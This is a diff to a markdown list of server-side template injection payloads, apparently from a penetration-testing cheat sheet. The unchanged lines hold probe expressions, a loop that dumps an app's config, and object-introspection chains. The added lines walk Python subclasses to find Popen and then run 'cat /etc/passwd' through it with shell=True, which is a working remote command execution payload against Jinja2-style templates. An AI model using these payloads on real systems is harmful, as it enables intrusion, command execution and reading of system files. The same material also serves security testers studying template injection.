@@ -17,7 +17,7 @@ Even in cases where full remote code execution is not possible, an attacker can 
 
 #### Payloads :
 
-```
+```py
 {{2*2}}[[3*3]]
 {{3*3}}
 {{3*'3'}}
@@ -33,6 +33,8 @@ ${{3*3}}
 {{ [].class.base.subclasses() }}
 {{''.class.mro()[1].subclasses()}}
 {{ ''.__class__.__mro__[2].__subclasses__() }}
+{{''.__class__.__base__.__subclasses__()}} # Search for Popen process, use payload below change 227 to index of Popen
+{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
 {% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
 {{'a'.toUpperCase()}} 
 {{ request }}
